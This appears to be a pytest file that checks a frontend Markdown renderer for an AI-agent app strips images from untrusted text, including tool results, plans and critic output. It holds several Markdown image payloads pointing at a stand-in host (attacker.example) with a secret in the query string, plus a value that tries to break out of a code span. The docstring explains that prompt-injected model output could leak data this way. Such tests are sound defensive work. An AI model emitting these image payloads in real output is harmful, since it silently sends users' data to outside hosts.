"""Frontend Markdown hygiene (review M2): untrusted text must never render as an image.

A rendered Markdown image is fetched by the viewer's browser immediately, so data or
prompt-injected model output could exfiltrate values in the image URL without any click.
"""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

markdown_it = pytest.importorskip("markdown_it")

_PATH = Path(__file__).resolve().parents[1] / "frontend" / "render.py"
_spec = importlib.util.spec_from_file_location("frontend_render", _PATH)
render = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(render)

EXFIL = "![x](https://attacker.example/p?d=secret)"
REF_EXFIL = "![x][1]\n\n[1]: https://attacker.example/p?d=secret"
NESTED = "![a](https://attacker.example/p?d=(secret))"


def _has_image(md: str) -> bool:
    tokens = markdown_it.MarkdownIt("commonmark").parse(md)
    stack = list(tokens)
    while stack:
        tok = stack.pop()
        if tok.type == "image":
            return True
        stack.extend(tok.children or [])
    return False


@pytest.mark.parametrize("payload", [EXFIL, REF_EXFIL, NESTED])
def test_report_cannot_render_images(payload):
    assert _has_image(payload)  # sanity: the payload is an image before sanitising
    assert not _has_image(render.report_markdown(f"# Report\n\n{payload}\n"))


@pytest.mark.parametrize(
    ("event", "data"),
    [
        ("tool_result", {"name": "run_sql", "ok": True, "summary": f"| note |\n| {EXFIL} |"}),
        ("plan", {"plan": REF_EXFIL}),
        ("critic", {"verdict": "revise", "issues": [NESTED]}),
        ("approval_required", {"summary": EXFIL}),
        ("stop", {"status": "max_turns", "detail": EXFIL}),
        ("error", {"message": EXFIL}),
    ],
)
def test_trace_lines_cannot_render_images(event, data):
    line = render.describe(event, data)
    assert line is not None and not _has_image(line)


def test_code_span_cannot_be_closed_by_the_value():
    col = "x` ![a](https://attacker.example/p) `"
    md = render.code_span(col)
    assert md.count("`") == 2 and not _has_image(render.safe_md(md))
